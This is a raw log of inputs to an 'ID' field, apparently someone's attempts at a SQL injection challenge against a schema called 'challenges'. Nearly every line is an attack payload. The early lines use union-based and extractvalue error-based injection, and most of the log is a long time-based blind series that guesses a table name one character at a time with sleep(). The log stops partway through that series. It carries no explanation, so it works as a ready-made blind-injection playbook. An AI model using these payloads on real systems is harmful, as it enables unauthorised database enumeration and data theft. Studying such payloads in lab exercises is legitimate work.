ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if( left(database(),1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'Y' ,sleep(3),0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yr') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ys') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yt') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yu') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yv') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yw') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yx') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yy') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yz') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yA') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yB') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yC') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yD') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yE') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yF') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yG') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yH') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yI') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yJ') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yK') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yL') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yM') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yN') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yO') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yP') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yQ') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yR') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yS') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yT') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yU') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yV') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yW') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yX') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yY') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yZ') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'y0') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0a') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0b') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0c') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0d') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0e') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0f') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0g') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0h') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0i') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0j') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0k') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0l') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0m') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0n') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0o') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0p') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0q') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0r') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0s') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0t') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0u') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0v') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),3) = 'y0w') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wa') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wb') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wc') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0we') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wf') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wg') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wh') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wi') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wj') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wk') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wl') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wm') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wn') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wo') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wp') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wq') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wr') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0ws') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wt') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wu') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wv') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0ww') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wx') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wy') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wz') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wA') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wB') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wC') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wD') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wE') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wF') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wG') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wH') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wI') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wJ') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wK') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wL') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wM') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wN') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wO') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wP') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wQ') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wR') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wS') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wT') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wU') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wV') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wW') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wX') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wY') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0wZ') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0w0') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),4) = 'y0w1') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1a') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1b') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1c') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1d') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1e') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1f') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1g') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1h') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1i') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1j') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1k') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1l') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1m') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1n') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1o') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1p') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1q') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1r') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1s') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1t') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1u') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1v') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),5) = 'y0w1w') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1wa') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1wb') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1wc') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1wd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1we') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1wf') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),6) = 'y0w1wg') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wga') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgb') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgc') , sleep(5) , 0) #
